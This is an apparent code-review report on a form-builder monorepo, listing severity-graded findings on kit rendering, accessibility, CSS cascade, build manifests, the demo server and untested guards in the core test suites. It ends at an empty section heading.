- **[HIGH]** **[E5]** **(Verified. Converged: three slices.)** `kit-mui/src/definitions.ts:50` — the `gap` defaults were never migrated when the renderer moved gaps to CSS pixels, so every layout container dropped from the MUI palette renders an 8× too-tight 2px gap. Counted directly: `kit-mui` declares `gap: 2` for `Screen` (`:50`), `Stack` (`:63`), `Step` (`:245`) and `Repeater` (`:267`), and `gap: 16` for `Grid` (`:209`); `kit-html` declares `gap: 16` for all five. `instantiate` writes `defaultProps` into the node as static props, so the prop is *present*, and `renderers.tsx:143` computes `px(num(props['gap'], GAP))` → `"2px"`, which makes the `GAP = 16` fallback unreachable for any instantiated node. Two comments are now false: `:244` ("MUI's spacing scale, like Screen and Stack. 16 here would be 128px") and `docs/spec/02-kit-contract.md:164-168`'s "a form that never set a gap looks identical". The kit also disagrees with itself: `Grid` is 16 and `Stack` is 2, both now meaning pixels. Failure scenario: an author builds the same form in the two shipped kits and gets an 8× different layout from identical palette actions; `apps/playground/src/sample.ts:22` (`gap: prop(2)`) ships the demonstration. Why no guard caught it is in Area G.

## packages/kit-mui/src/index.ts

No issues found.

## packages/kit-mui/package.json

- **[NOTE]** **[E2]** `packages/kit-mui/package.json:32` — `react-dom` is a required peer this package never imports; at least implied by `@mui/material`, which declares it itself.

## packages/kit-mui/tsconfig.json

No issues found.

## packages/kit-mui/README.md

- **[NOTE]** **[E2]** `packages/kit-mui/README.md:24` — "Copy this package as the starting point for a kit of your own" contradicts `02-kit-contract.md:203` ("Copy `packages/kit-html`… deliberately dependency-free"), and this kit is the one with the two contract bugs above.

## packages/kit-html/src/renderers.tsx

- **[MEDIUM]** **[E4]** `kit-html/src/renderers.tsx:977` — `BreadcrumbsNode` reads `props['label']` for the landmark's accessible name, but the kit declares no `label` prop on `Breadcrumbs`, so the fix the comment above it describes is unreachable. `definitions.ts:630-645` declares `items` only; `Properties.tsx:37` builds the panel from `def?.props ?? []`, so no editor is ever rendered for it, and with no schema there is no i18n binding mode either. `03-components.md:182` also lists `items` as the only property, and `test/docs.test.ts` compares that table to both kits, so the two files and the catalogue row have to move together. Failure scenario: a form localised to French renders `<nav aria-label="Breadcrumb">` — the exact defect the comment says it fixed.
- **[MEDIUM]** **[E4]** `kit-html/src/renderers.tsx:863` — the "Holding …" line is the only on-screen statement of what a `FileUpload` will submit, and it is not referenced by the input's `aria-describedby`; the input is described only by the helper/error element. MUI folds the same string into `helperText`, which is the element it wires `aria-describedby` to, so this is a divergence the other kit got right.
- **[MEDIUM]** **[E4]** `kit-html/src/renderers.tsx:859` — a second identical file refusal is announced to nobody and shows no visible change: `setDropped(chosen.length - kept.length)` writes the same number twice, React re-renders the same `<p role="alert">` with identical text, and a live region only announces on mutation. The repo already solved this class elsewhere by appending a zero-width space (`docs/accessibility.md:97`).
- **[MEDIUM]** **[E4]** `kit-html/src/renderers.tsx:266` (and 288, 317, 364, 531, 768, 824) — seven of the nine field renderers put `nodeProps` on an unclassed wrapper `<div>` and `.fsh-field` one level in, while `SwitchNode:584` and `RadioGroupNode:666` put `nodeProps` on `.fsh-field` itself, so the two halves of the kit have different DOM shapes at the seam everything external keys off. The `min-width: 0` at `kit-html.css:110-115` is inert for those seven, and per-component Style-tab CSS lands on the wrapper for seven and on `.fsh-field` for two. Failure scenario: a `TextField` and a `Switch` in a row `Stack` given the same Style-tab block get two different layouts.
- **[LOW]** **[E4]** `kit-html/src/renderers.tsx:692` — the `options` path pre-checks an option whose declared value is the empty string on an unanswered group, which is precisely what the sibling `RadioItemNode` guards against twenty lines later. Options authored as `[{label:'Prefer not to say', value:''}, …]` render with the first radio already selected.
- **[LOW]** **[E3]** `kit-html/src/renderers.tsx:44` — `str` treats "not a string" and "empty string" as the same thing (`typeof v === 'string' && v ? v : fallback`), so a non-string label, text, helper or placeholder renders as the fallback rather than as its text. A `computed` binding is evaluated by the host at render time, so a number can arrive. Shared with `kit-mui:57`, so not a divergence.
- **[LOW]** **[E3]** `kit-html/src/renderers.tsx:89` (also 102, 148, 169, 419-425, 436-442) — every length this kit takes from the document is written as an inline `style`, so Style-tab CSS for the same properties silently loses to it, while the same document on the MUI kit takes effect (MUI writes through `sx`, which emits a class the `(0,2,0)` selector beats). An author sets `padding: 24px` on a `Box` in the Style tab; it applies under `kit-mui` and does nothing under `kit-html`, with no indication why.
- **[NOTE]** **[E2]** `kit-html/src/renderers.tsx:269` — `TextField` with `multiline` renders a fixed `rows={4}` textarea, while the separate `TextArea` exposes `rows` and MUI's multiline auto-grows. The same document renders a different height in each kit.
- **[NOTE]** **[E2]** `kit-html/src/renderers.tsx:511` — `src={safeHref(props['src']) ?? ''}` with `defaultProps: { src: '' }` means a freshly dropped `Image` emits `<img src="">`. Same in `kit-mui:547`.
- **[NOTE]** **[E2]** `kit-html/src/renderers.tsx:676-677` — `RadioGroupContext.Provider` gets a fresh object literal every render, so every `RadioItem` re-renders whenever the group does. Cheap here; worth noting because this is the file a third-party kit author is told to copy.
- **[NOTE]** **[E2]** `kit-html/src/renderers.tsx:253` — ids come from `useId()` with no per-form prefix, and React only guarantees uniqueness within one root, so two independently mounted roots produce colliding ids and the second form's `htmlFor`/`aria-describedby` resolve into the first. The kit cannot fix this alone (`data-fs-scope` is also `useId()`), but the host-side mitigation is documented nowhere.

## packages/kit-html/src/definitions.ts

- **[MEDIUM]** **[E4]** `kit-html/src/definitions.ts:636-643` — `Breadcrumbs` declares only `items` while its renderer reads a `label` prop. The omission side of the finding above.
- **[LOW]** **[E4]** `kit-html/src/definitions.ts:193-200` — `Button.variant` offers `solid | outline | plain` while `kit-mui` offers `contained | outlined | text`, and neither renderer recognises the other's vocabulary, so a document authored on one kit renders a different button on the other — against `README.md:25-27`'s claim that "a document authored against one kit renders against the other". `Card`, `Text`, `Alert` and `Progress` all share their value vocabularies, so `Button` is the odd one, and the divergence is written down nowhere.
- **[NOTE]** **[E2]** `kit-html/src/definitions.ts:86` — `Heading` starts a new heading at `h2` while `kit-mui` starts at `h5`. Both renderers agree on `h2` for a document that names no rank, but a heading dropped in one kit and rendered in the other changes the document outline. The MUI side carries a comment calling `h5` "this kit's own call about size"; this file says nothing.
- **[NOTE]** **[E2]** `kit-html/src/definitions.ts:136` — `Checkbox.defaultProps` omits `helperText` although the prop is declared and read; every other field that declares it seeds it with `''`.

## packages/kit-html/src/index.ts

No issues found.

## packages/kit-html/src/kit-html.css

- **[MEDIUM]** **[E4]** **(Verified.)** `kit-html.css:156-169` — the stylesheet defines `.fsh-field__message` but not `.fsh-field__error` or `.fsh-field__hint`, both of which this kit's own renderer uses. Confirmed by grep: those two class names appear only at `renderers.tsx:863` and `:865`, and no `.css` file in the repo declares either. Two consequences: the oversized-file refusal renders in `--fsh-text` rather than `--fsh-danger`, so only the wording marks it as an error; and both paragraphs keep the UA's default `margin-block: 1em` inside a `.fsh-field` whose gap is 4px, because the `margin: 0` reset is on the class they do not carry. `test/contrast.test.ts` measures token pairs only, so nothing in CI observes it.
- **[MEDIUM]** **[E3]** `kit-html.css:361-406` — the `Switch` has no state signal that survives forced-colors mode: the input is `opacity: 0` (which forced colors does not override) and the entire visible state lives in `background` on the track and knob, which forced colors replaces identically for both states. There is no `@media (forced-colors: active)` block, though the comment at `:216-221` shows the author was already thinking about Windows high contrast. `.fsh-progress__fill` has the same shape. A high-contrast user cannot tell an on switch from an off one, while the native `.fsh-checkbox` beside it works fine.
- **[LOW]** **[E4]** `kit-html.css:110-115` — `.fsh-field { min-width: 0 }` is inert for seven of the nine field components, for the reason given under `renderers.tsx:266`. `.fsh-radios { min-width: 0 }` at `:326-330` is inert for the same reason. The comment at `:91-99` describes a fix that landed on the wrong element for most of the kit.
- **[NOTE]** **[E2]** `kit-html.css:62-74` and `:77-89` — the dark palette is written out twice, byte for byte. `test/contrast.test.ts` asserts the two blocks stay in step, so drift fails CI, but the duplication is not noted at either block.
- **[NOTE]** **[E3]** `kit-html.css:529-533` — `.fsh-progress--circular` reshapes the linear track into a 28px circle, so the percentage-width fill paints a horizontal chord rather than an arc, and the indeterminate variant translates a block across a circle. `kit-mui` draws a real `CircularProgress`, so `variant: 'circular'` is the one prop value in the catalogue whose two kits produce visually unrelated output.

## packages/kit-html/package.json

No issues found.

## packages/kit-html/tsconfig.json

No issues found.

## packages/kit-html/README.md

- **[NOTE]** **[E2]** `packages/kit-html/README.md:31` — "Each field owns a real `<label for>`" is not true of every field: `RadioGroupNode` uses `<fieldset><legend>`, which is the correct markup for a group and what `02-kit-contract.md:657-664` argues for. The blanket claim understates the design and would mislead a kit author copying this package.

---

# Area D — designer chrome CSS, playground, demo server

## packages/designer/src/designer.css

- **[MEDIUM]** **[E4]** **(Verified.)** `designer.css:195-231` — `.fs-panel button` and `.fs-panel input, .fs-panel select, .fs-panel textarea` are specificity `(0,1,1)` and therefore beat every later single-class rule `(0,1,0)` that styles the same elements, regardless of source order, so whole blocks that read as deliberate never apply. Read side by side: the panel rules set `font: inherit; padding: 5px 10px; background: var(--fs-bg-panel); border: 1px solid …` for buttons and `width: 100%; padding: 5px 8px; background: var(--fs-bg-app)` for inputs. The losing rules include `.fs-tabs__tab` (`:443-451`, `background: none; border: none; padding: 6px 12px`), rendered as `<button>` by `Tabs.tsx` inside both `.fs-panel` asides; `.fs-color__swatch` (`:1306-1314`, `inline-size: 28px; padding: 0; background: none`), whose own comment says "below about 28px a colour well is a coloured line" — logical and physical properties cascade together, so `inline-size` does not escape `width`; and `.fs-code__area`, `.fs-binding__expression`, `.fs-tree__remove`, `.fs-rule__remove`, `.fs-prop-row__clear`, `.fs-toolbar__toggle`. Failure scenario: `11-theming.md:52` documents `--fs-font-mono` for "The JSON editor, the raw CSS box, the code editor"; only `.fs-dialog__editor` is outside `.fs-panel` and actually gets it, so the raw-CSS box and the expression editor render in the proportional UI font while the token they name is unreachable. `test/docs.test.ts` checks that tokens are declared, not that the rule using them wins.
- **[MEDIUM]** **[E3]** `designer.css:384` — `.fs-canvas__surface { touch-action: pan-y }` applies to the whole subtree, which includes every kit component rendered on the canvas, so pinch-zoom is disabled for any touch starting over the form. A low-vision user on a tablet cannot pinch to magnify the form being authored — a WCAG 1.4.4 hazard against a repo targeting AA. This is invariant 3 in substance, not in selector shape: the guard parses selectors, so a non-inherited property that still governs descendants is invisible to it.
- **[MEDIUM]** **[E4]** `designer.css:10-55, 75-88` — the shell declares a complete dark palette but never declares `color-scheme`, so every user-agent-rendered control inside a dark builder is painted with the light scheme: the properties panel's checkboxes, the colour swatch, `<select>` popups and number spinners. The file already hand-writes four `::-webkit-scrollbar` rules for a problem `color-scheme` addresses natively.
- **[MEDIUM]** **[E4]** `designer.css:1179-1187` — `.fs-canvas__data pre { max-height: 180px; overflow: auto }` creates a scrollable region whose markup carries no `tabindex`, so a keyboard user cannot scroll the preview Data or Errors dump. `docs/accessibility.md:122-127` states that `scrollable-region-focusable` is one of three axe rules disabled by name in the jsdom run, so the enforced suite is configured so it cannot report this.
- **[LOW]** **[E3]** `designer.css:829` — `.fs-drag-label { z-index: 20 }` contradicts the reasoning two rules earlier, where `.fs-drop` was raised to 5000 and `.fs-selection` to 4000 precisely because "MUI's `AppBar` defaults to 1100 and hid the drop indicator entirely". No ancestor creates a stacking context, so the label sits in the root stacking context at 20 and is painted over by an `AppBar`, a `Drawer`, or the drop bar itself.
- **[LOW]** **[E4]** `designer.css:688-702` — `.fs-languages__add button` is byte-identical to the shared panel-button block, comment included, and entirely redundant, because `.fs-languages__add` is inside `.fs-panel`. The two-blocks-for-one-idea hazard the comments at `:255-262` say was eliminated.
- **[LOW]** **[E4]** `designer.css:1215-1217` — `.fs-prop-row__control input[type='checkbox'] { align-self: start }` does not achieve what its comment claims: it wins for `align-self` but declares no width, so `.fs-panel input { width: 100% }` is uncontested and every boolean property editor renders a checkbox as wide as the control column.
- **[LOW]** **[E4]** `designer.css:534` — `.fs-dialog__errors { padding: 8px 8px 8px 24px }` is the only asymmetric physical-direction shorthand in a file that otherwise uses logical properties throughout, and `FormSettings.tsx:180` shows the product is bidi-aware.
- **[LOW]** **[E2]** `designer.css:725, 1086, 1137, 1162, 1312, 1335` — six hardcoded corner radii bypass `--fs-radius`, which `11-theming.md:47` documents as the host-overridable corner radius and which this file's header calls the whole restyling mechanism.
- **[NOTE]** **[E2]** `designer.css:880-892` — the comment block above `.fs-canvas__frame` states "`revert` rather than a value" and is immediately contradicted by the block at `:895-911` ("`initial`, not `revert`, and the difference is the whole point"). A reader stopping at the first is told the rule does the exact thing the second explains it must not do.

## apps/playground/index.html

No issues found.

## apps/playground/package.json

- **[LOW]** **[E4]** `apps/playground/package.json:6-22` — the manifest's scripts run `vite` and its config imports `@vitejs/plugin-react` and `vite` directly, but neither appears in `dependencies` or `devDependencies` (there is no `devDependencies` block). Both are declared only at the workspace root. Resolution works today only because Node walks up to the root store; under pnpm the package is not installable on its own, and a root-level bump silently changes what this app builds with.

## apps/playground/src/App.tsx

- **[LOW]** **[E3]** `apps/playground/src/App.tsx:71, 83-90` — the document is persisted to `localStorage` but the selected kit is not, so a reload silently returns to Material UI after the author switched to Plain HTML. Both kits declare the identical 27 component types, so this is a lost view preference rather than an unrenderable document — but the app's headline demonstration is the kit switch, and it does not survive F5.
- **[NOTE]** **[E2]** `apps/playground/src/App.tsx:83-90` — `persist` runs `JSON.stringify` and a synchronous `localStorage.setItem` on every `onChange`, with no debounce, in the code most visitors read as the integration example.
- **[NOTE]** **[E2]** `apps/playground/src/App.tsx:114` — `height: '100vh'` on the shell wrapper; `100dvh` is the modern spelling for a layout that must not be cut off by mobile toolbars.

## apps/playground/src/main.tsx

No issues found.

## apps/playground/src/playground.css

No issues found.

## apps/playground/src/sample.ts

No issues found.

## apps/playground/tsconfig.json

No issues found.

## apps/playground/vite.config.ts

No issues found.

## apps/demo-server/package.json

- **[LOW]** **[E4]** `apps/demo-server/package.json:8-9` — `dev` and `start` run `node --experimental-strip-types src/index.ts` with no build prerequisite, but the file imports `@formsmith/core`, whose manifest exposes only `./dist/index.js`. `aliases.ts` covers vitest and the playground's Vite config, not plain Node resolution. On a clean checkout `pnpm dev:server` fails with `ERR_MODULE_NOT_FOUND` until `pnpm build` has run, with nothing saying so.
- **[NOTE]** **[E2]** `apps/demo-server/package.json:11-15` — `src/index.ts` uses `process`, `NodeJS.ErrnoException` and `unref()`, all of which need `@types/node`, declared only at the workspace root. Harmless in-repo, wrong the moment anybody copies the directory — which the file header explicitly invites.

## apps/demo-server/src/index.ts

- **[MEDIUM]** **[E3]** `apps/demo-server/src/index.ts:341-344, 430-431` — `GET /api/forms/:id` and `POST /api/forms/:id/submit` apply no shape guard to what comes out of the store, while `GET /api/forms` guards the identical hazard with a comment saying why ("Guarded, because the file is on disk and a person can edit it"). `readStore` returns `parsed as Store` with no per-entry validation, and the whole submit path is defensive rather than throwing, so a hand-edited `forms.json` containing `{"x": 5}` makes `POST /api/forms/x/submit` answer `200 {ok: true, received: {}}` — a submit reported as accepted and validated against a document that is not one — while the listing correctly filters `x` out. Silent success is the failure mode this file elsewhere goes out of its way to eliminate.
- **[LOW]** **[E4]** `apps/demo-server/src/index.ts:336` — the listing reports `doc.id` while every lookup route keys the store by the URL parameter, so the two agree only for entries written through this API. `PUT` enforces the match and its comment names this exact failure; nothing enforces it for a hand-edited entry, which is then listed under a name every fetch 404s.
- **[LOW]** **[E3]** `apps/demo-server/src/index.ts:348, 498` — one 400 with one message stands for four distinct refusals: an absent body, a body over `MAX_BODY`, unparseable JSON, and a body nested past `MAX_CONDITION_DEPTH`. A client sending a well-formed 4 KB document nested past 200 levels is told its body is too large, and an over-limit body gets 400 rather than 413, so a caller cannot distinguish "retry smaller" from "fix your JSON".
- **[NOTE]** **[E2]** `apps/demo-server/src/index.ts:268-271` — when the streamed size passes the cap, `await reader.cancel()` is inside the `try`, so a rejection from `cancel()` propagates out as a 500 rather than the intended 400. The `finally` still releases the lock, so only the status is wrong.
- **[NOTE]** **[E3]** `apps/demo-server/src/index.ts:468-470, 486-494` — a document this server cannot evaluate is answered `500`, attributing a document-level problem to a server fault; `501` or `422` would be honest. Matters because the header presents this file as the reference implementation and a copier inherits the status. Nothing leaks on the genuine-500 path: Hono's default handler returns bare text with no stack.

## apps/demo-server/tsconfig.json

No issues found.

---

# Area E — core's test suite

## packages/core/src/tree.test.ts

- **[HIGH]** **[E4]** **(Verified — the source-side defect is confirmed; converged with Area A.)** `tree.test.ts:2072` — the `flatten` describe, added per its own docblock precisely so core stops relying on a test in another package, pins only the happy path, so `flatten`'s complete absence of the totality and depth guards its sibling `walk` carries goes unnoticed. Both tests here (a 5-node fixture and an identity check) pass against the unguarded implementation, and `flatten` is not designer-only — `validation.ts:749` walks the tree with it. Failure scenario: no source change needed; a document with `"children": 5` throws out of `flatten` today and nothing is red.
- **[MEDIUM]** **[E4]** `tree.test.ts:1570` — `'updates the first match only, like every read path'` proves the `found` flag only for an update that returns a *different* object, which is exactly the case the pre-fix `changed`-only implementation also got right. `tree.ts:412-436` documents the distinction ("an update that returns its input unchanged… left the flag down and the walk carried on into the next sibling"), yet every `updateNode` call in the repo's tests either mutates the node or targets a missing key. Restore the original bug and all six tests stay green. The uncovered case is a duplicate key plus a no-op update on the first match — a controlled property editor writing the value the node already holds — which then silently edits the second node.
- **[MEDIUM]** **[E3]** `tree.test.ts:1952` — the test builds the exact document `validateDocument` has a branch for (`schema.validations: 'required'`) and asserts only that three consumers do not throw, never that the gate reports it. A repo-wide grep for `'.schema.validations must be an array.'` finds no test. Three sibling `malformed` branches are likewise untested anywhere: `.schema must be an object.`, `validations holds an entry that is not a rule.`, and `actions.X has params that are not an object.` Delete any one of those four `malformed(...)` calls and the whole suite stays green.
- **[LOW]** **[E3]** `tree.test.ts:786` — `'leaves the original untouched'` compares `JSON.stringify(original)` before and after, on a fixture whose nodes carry no `css`, `events`, `schema` or nested props — none of the records `duplicateNode` actually copies. It is the one invariant-4 assertion for this function and it cannot observe aliasing.
- **[LOW]** **[E2]** `tree.test.ts:184` — the `moveNode` describe has no immutability assertion at all, while `insertNode`, `removeNode` and `updateNode` each pin invariant 4. The operation that composes remove-then-insert — the one drag-and-drop calls — never checks that its input tree is unchanged after a *successful* move.
- **[NOTE]** **[E3]** `tree.test.ts:2035` — for the `key: 42` row, the key error is itself coded `malformed`, so the `codes.some(c => c === 'malformed')` assertion is satisfied by the error the row is not about; only the length check does any work.

## packages/core/src/rows.test.ts

- **[MEDIUM]** **[E4]** `rows.test.ts:173` — `'recognises a repeater from its shape, not from a type string'` is the only test of that rule in the repo, it exercises one of the two implementations of it, and its fixtures cannot tell them apart: all three cases agree under both `validation.ts:727` and `rows.ts:459`. Failure scenario: a node with `schema.type: 'array'` and `children: 5` is a repeater to `validateForm` and not to `rowScopeProblems`/`keyScopesFor`, and `validateForm` then throws `TypeError: node.children is not iterable` out of the server-side validator.
- **[LOW]** **[E3]** `rows.test.ts:975` — `'stops before a body can turn into unbounded work'` asserts `Object.keys(errors).length < 100_000` and that the messages contain `'rows'`, while the same file's `NOT_A_LIST` test deliberately asserts both the literal text and the exported constant. `MAX_ROWS` and `TOO_MANY_ROWS` are exported and neither is named, so the cap's value is unpinned between 200 and 100 000.
- **[NOTE]** **[E2]** `rows.test.ts:27` — `NO_ROWS` is documented as frozen so identity comparisons in a memo hold, and nothing asserts `Object.isFrozen(NO_ROWS)`.

## packages/core/src/depth.test.ts

- **[HIGH]** **[E4]** **(Verified. Converged: three slices.)** `depth.test.ts:98` — the `WALKERS` table states its own completeness rule ("A sixth walker added later is a row, and a row that is not added is a hole somebody can see") and the walker on the submit path is missing: `validateForm`'s recursion is unbounded (`validation.ts:644`, confirmed by reading the declaration). `validateForm`'s `visit` calls `isVisible` on every node, so it crosses a condition on every level and belongs in this table by the file's own criterion. No test anywhere drives `validateForm` past a shallow tree. Failure scenario: a document nested a few thousand deep — the same depth the *gate* is proven to survive at `tree.test.ts:1824` — throws `RangeError` out of `validateForm`, which is the unhandled 500 on submit this whole file exists to prevent.
- **[NOTE]** **[E3]** `depth.test.ts:1` — the file has no `depth.ts` and does not claim one; it is a cross-module table over seven walkers, and the header says so. The naming is honest and the `DEPTH = 50_000` fixtures do reach the bound, so the rows are not passing on arithmetic that never recursed.

## packages/core/src/factory.test.ts

- **[MEDIUM]** **[E4]** `factory.test.ts:17` — the describe is named for "a component definition a kit got wrong" and covers the second half of `instantiate`'s own argument while leaving the first half — the prototype-pollution defence the code was restructured for — untested. `factory.ts:57-66` builds props on `Object.create(null)` specifically because "a `defaultProps` key of `__proto__` on an object literal runs the setter rather than adding a property"; the four rows here pass `undefined`/`null`/a string/an array, and a repo-wide grep finds `__proto__` tests in seven other files and none for `instantiate`. Revert to `{}` and every test in the repo stays green.
- **[LOW]** **[E2]** `factory.test.ts:18` — the `base` def sets neither `container` nor `dataBound`, so the `dataType ?? 'string'` fallback — which decides whether a node is a repeater under `isRowScope` — has no direct assertion in core.

## packages/core/src/keys.test.ts

- **[NOTE]** **[E3]** `keys.test.ts:89` — the guard runs in one direction only: the engine-oracle test catches an `Object.prototype` member missing from `RESERVED_KEYS` and the `it.each` catches an entry deleted from it, but nothing catches an entry being *added*, since the list is never compared for set-equality. Appending a name silently invalidates every existing document using that key with nothing going red. Everything else in this file is sound.

## packages/core/src/json.test.ts

- **[HIGH]** **[E4]** **(Verified — and it is a live source defect, not only a test gap.)** `json.test.ts:54` — `'round-trips every option through the spelling the kit rendered'` never calls the function that produces that spelling: the test computes the submitted string as `jsonToString(option.value)`, the same expression `optionValue` compares against internally, so the round-trip is symmetrical by construction. The spelling a control actually puts in the DOM comes from `optionEntry`, whose docstring says "The rules are `optionValue`'s, exactly, because the two have to be inverses" and which both kits use for that. Verified against the source: `optionEntry` computes `const declared = record ? record['value'] : option; const value = declared == null ? String(index) : jsonToString(declared)`, so for `options = [{label:'A'}, {label:'B', value:0}]` both entries render `value: '0'` — two `<option>`s with the same value — and `optionValue(options, '0')` returns `0`, B's answer, for a user who picked A. Every test in this file passes against that. Reachable through the JSON options editor and through JSON Schema `enum` import rather than through the normal picker.
- **[NOTE]** **[E3]** `json.test.ts:210` — the test deletes a global (`delete URL.parse`) and restores it in `finally`. Safe as written because vitest isolates per file and this file is not concurrent, but it is the one piece of shared mutable global state in the assigned files.

## packages/core/src/validation.test.ts

- **[HIGH]** **[E4]** `validation.test.ts` (whole file) — nothing in this file, or anywhere in the repo, hands `validateForm` or `submittedData` a node whose `children` is not an array, although every neighbouring walker has exactly that test (`context.test.ts:481`, `css.test.ts:604-620`, `renderer.test.tsx:1649`). `children: 7` is not nullish, so `for…of 7` throws. The two functions a server calls on submit do not carry the row. No source change needed for the failure.
- **[HIGH]** **[E4]** **(Verified. Converged: three slices.)** `validation.test.ts` (whole file) — `validateForm`'s tree walk carries no depth bound and no test drives either walk deep. Two consequences, neither pinned: a deeply nested document is a `RangeError` out of the submit path, and for any tree deeper than 500 `validateForm` requires fields that `submittedData` silently drops from the payload — contradicting the test at `:686` ('agrees with validateForm about what is on screen'), which only ever uses a two-level fixture. Delete `validation.ts:808` and the whole suite stays green; that guard has never been executed.
- **[HIGH]** **[E4]** `validation.test.ts:907` — the `Object.prototype`-key block drives only `validateAcross`, leaving `submittedAcross` — same hazard, `merged[key] ??= value` — with no test of any kind in core. Change `validation.ts:891` to `const merged: FormData = {}` and every answer submitted under a data key of `toString`, `valueOf`, `constructor`, `hasOwnProperty` or `isPrototypeOf` disappears from the projected payload, on the submit path, with nothing failing.
- **[MEDIUM]** **[E4]** `validation.test.ts:1181-1189` — the test named "does not catch every blowup, and says so" asserts on a pattern that is not the hole its own comment names: the comment names `(a|a)*` as the uncaught exponential shape and says "if a later change does start catching it, this test says so"; the assertion uses `^(ab|cd)+$`, a benign alternation. Add alternation detection that refuses `(a|a)*` and this test, whose entire job is to notice, stays green.
- **[MEDIUM]** **[E3]** `validation.test.ts:102-114` — the invariant-5 table enumerates five flavours of empty and omits `{}`, which `json.ts:214` counts as empty and which is defended only for `required`. The `custom` row is separately near-vacuous: with no evaluator `applyRule` returns before reaching the empty short-circuit, and the only case that exercises it with a live evaluator is `undefined`.
- **[MEDIUM]** **[E3]** `validation.test.ts:1695` — the row cap is pinned for `validateForm` and not for the projection; `validation.ts:836` is never executed, though the docblock says the bounds are duplicated there precisely because a host may project before it validates.
- **[LOW]** **[E3]** `validation.test.ts:1648-1655` — `patternProblem`'s rows assert only `toBeDefined()`, so which of the two sentences an author is shown is unpinned, and that string is what the Rules tab puts in front of them.

## packages/core/src/condition.test.ts

- **[MEDIUM]** **[E3]** `condition.test.ts:166-174` — the one exit where an unanswerable comparison still becomes a reason to *show* has no test: `condition.ts:233` answers `false` rather than `undefined`, so `not(gt(…))` is `true`. The file's own `in`/`notIn` block exists because that exact shape was a bug; this test asserts `gt` and `lt` are false and never negates either, so the line can be changed in either direction without a test noticing.
- **[LOW]** **[E3]** `condition.test.ts:150-159` — `NaN` is tested only through `order`, never through `same`, so `eq` on two `NaN` readings being `false` (and `ne` `true`) is unpinned. `same` is also the dedupe used by `contextValues`.
- **[LOW]** **[E3]** `condition.test.ts:188-193` — `empty`/`notEmpty` are never exercised on `{}`, so the object branch of the shared `isEmpty` is only defended from the validation side. Two definitions of empty diverging is the failure that docblock names.

## packages/core/src/context.test.ts

- **[HIGH]** **[E4]** `context.test.ts:496-525` — the only deep fixture for the boot-time walkers nests through `not`, the branch that never had the bug. The depth argument is therefore only ever carried through the `not` recursion; the `conditions` loops at `context.ts:64` and `:294` are never reached at depth by any test in the repository, and `and`/`or` is the branch the panel actually produces — `condition.ts:297-300` records that this is exactly where the depth argument was dropped once already. Delete `+ 1` on both lines and the entire suite stays green while `contextKeys(root)` throws a `RangeError` during a host's startup.
- **[LOW]** **[E3]** `context.test.ts:606-615` — the DoS cap is bracketed rather than pinned: `toBeLessThanOrEqual(1000)` plus a 40-step control leaves any value between 40 and 1000 green, and the constant is neither exported nor asserted.
- **[LOW]** **[E2]** `context.test.ts:638-644` — the no-key path asserts only a length, so the placeholder string a host reads when deciding whether it needs a sandbox is unasserted.

## packages/core/src/visibility.test.ts

- **[MEDIUM]** **[E3]** `visibility.test.ts:269-275` — the malformed-condition case tests a bad `op` inside a present condition, never a `renderWhen` of `{ kind: 'condition' }` with no `condition` at all. `visibility.ts:90` passes the missing condition to the evaluator, which reads it as unreadable and collapses to `false`, so the node and its whole subtree leave `validateForm` — the opposite answer this file pins for an unreadable *kind*, and the difference between the two is one missing property in a hand-edited document.

## packages/core/src/language.test.ts

No issues found.

## packages/core/src/schema.test.ts

- **[HIGH]** **[E4]** **(Verified. Converged: two slices.)** `schema.test.ts:770-778` — "does not overflow on a document nested deeper than the gate walks" exercises the one branch that is bounded and misses the two that are not: the fixture is 50 000 nested `Box` nodes with no `schema`, which take the `visit(child, depth + 1)` path, while the schema-carrying branch recurses as `visit(child)` with depth defaulting to 0 and the repeater path restarts through a fresh `objectFor`. Failure scenario: 50 000 nested repeaters, or a chain of schema-carrying nodes with children, still throws `RangeError` out of `toJsonSchema` in the JSON dialog while this test reports the document is safe.
- **[HIGH]** **[E4]** `schema.test.ts:698` — the "document that is data" block varies `props` and depth and never varies `children`, so `children: 7` is a `TypeError` out of `toJsonSchema` while `unexportableRules` in the same file survives it by borrowing the hardened `walk` — two exports of one module disagreeing about the same document. `context.test.ts:481` and `css.test.ts:604` both carry this row for their walkers.
- **[MEDIUM]** **[E4]** `schema.test.ts:401-425` — every shared-data-key fixture is two top-level fields, so the collision check is never asked about a row. `schema.ts:130-133` adds every schema-bearing node's data key to one flat `claimed` set with no row awareness, while `toJsonSchema` puts a row's fields in a separate `properties` object under `items`. A top-level `email` and an `email` inside a repeater are reported as colliding — a false report from the one function whose job is to be believed about losses.
- **[MEDIUM]** **[E3]** `schema.test.ts:725-743` — the "keyword on a type that has no length" test covers `minLength` on a number and leaves the mirror cases untested; no fixture puts `min`/`max` on a `string` or `pattern` on a `number`. The export then states a keyword every validator ignores for that type while the form enforces it, and `unexportableRules` does not report it.

## packages/core/src/css.test.ts

- **[HIGH]** **[E4]** `css.test.ts:603-620` — the malformed-tree block varies only `children`, and the key is the argument that actually throws: `styleSheetFor` reaches `selectorFor(node.key, scope)` for any node carrying `css`, and `escapeKey` calls `key.replace`, so a node with `"key": 42` and a `css` block is a `TypeError`. That shape is one this repo already treats as real (`context.ts:172` handles it explicitly and `context.test.ts:638` tests it), and `styleSheetFor` runs inside the renderer's `useMemo`, so the throw takes the whole form off screen for someone who cannot edit the document.
- **[HIGH]** **[E4]** `css.test.ts:515-529` — the unterminated-quote guard is tested and its escape clause is not; no fixture anywhere in the file puts a backslash inside a declaration block, and the escape tests at `:349` and `:356` exercise `splitTop`, a different reader, which is easy to mistake for coverage of this one. Delete `css.ts:90-93` and every test stays green while `content: "a\"` is counted as balanced, emitted into the sheet, and swallows its own closing brace and the rules after it. This is the same blind spot the confirmed `FORBIDDEN` backslash bypass in Area A sits in.
- **[LOW]** **[E3]** `css.test.ts:405-417` — the fetch refusals are all lower case, so the `i` flag on `FETCHING` is unasserted in either sink: `URL(https://…)` and `Image-Set(…)` would pass a case-sensitive regex and no row would fail.
- **[LOW]** **[E3]** `css.test.ts:456-473` — the three author-CSS sinks take three different positions on control characters and only two are stated; the case that falls between — a control character inside a quoted declaration value — is pinned nowhere.

---

# Area F — the designer's test suite

## packages/designer/src/Designer.test.tsx

